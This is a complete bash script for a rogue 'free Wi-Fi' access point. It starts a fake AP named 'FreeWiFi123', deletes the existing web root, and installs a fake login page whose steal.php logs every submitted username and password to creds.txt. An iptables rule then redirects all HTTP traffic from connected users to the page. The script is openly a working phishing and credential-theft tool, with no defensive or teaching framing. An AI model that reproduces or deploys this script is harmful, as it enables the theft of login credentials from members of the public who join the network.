#!/bin/bash

# Step 1: Detect working Wi-Fi interface
echo "[*] Detecting a suitable Wi-Fi interface for AP mode..."

WIFI_INTERFACE=""
for iface in $(ls /sys/class/net); do
    if [[ "$(iw dev "$iface" info 2>/dev/null | grep type | awk '{print $2}')" == "managed" ]]; then
        if iw list 2>/dev/null | grep -A 10 'Supported interface modes' | grep -q AP; then
            WIFI_INTERFACE="$iface"
            echo "[+] Found Wi-Fi interface with AP mode support: $WIFI_INTERFACE"
            break
        else
            echo "[-] $iface does not support AP mode."
        fi
    fi
done

if [ -z "$WIFI_INTERFACE" ]; then
    echo "[!] No suitable Wi-Fi interface found that supports AP mode."
    exit 1
fi

# Step 2: Set default internet-sharing interface (manually editable if needed)
INTERNET_INTERFACE="ens33"
FAKE_SSID="FreeWiFi123"
PORTAL_DIR="/var/www/html"
LOG_FILE="/var/www/html/creds.txt"

# Step 3: Bring up Wi-Fi interface
echo "[*] Bringing up Wi-Fi interface..."
sudo ip link set $WIFI_INTERFACE up

# Step 4: Create fake AP using create_ap
echo "[*] Starting fake AP with SSID: $FAKE_SSID"
create_ap --no-virt -n $WIFI_INTERFACE $FAKE_SSID &

# Step 5: Setup fake login page
echo "[*] Setting up phishing portal..."
sudo apt install apache2 -y
sudo rm -rf $PORTAL_DIR/*
echo '<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
  <h2>Welcome to Free WiFi</h2>
  <form action="steal.php" method="POST">
    Username: <input type="text" name="username" /><br>
    Password: <input type="password" name="password" /><br>
    <input type="submit" value="Login" />
  </form>
</body>
</html>' | sudo tee $PORTAL_DIR/index.html > /dev/null

echo '<?php
file_put_contents("creds.txt", date("c") . " | " . $_POST["username"] . " | " . $_POST["password"] . "\n", FILE_APPEND);
?>' | sudo tee $PORTAL_DIR/steal.php > /dev/null

# Step 6: Start Apache
echo "[*] Starting Apache server..."
sudo systemctl restart apache2

# Step 7: Redirect all HTTP traffic to phishing portal
echo "[*] Redirecting HTTP traffic to local server..."
sudo iptables -t nat -A PREROUTING -i $WIFI_INTERFACE -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80

echo "[+] Setup complete. Any user connecting to '$FAKE_SSID' will be redirected to a login page."
echo "[*] Captured credentials will be stored in $LOG_FILE"
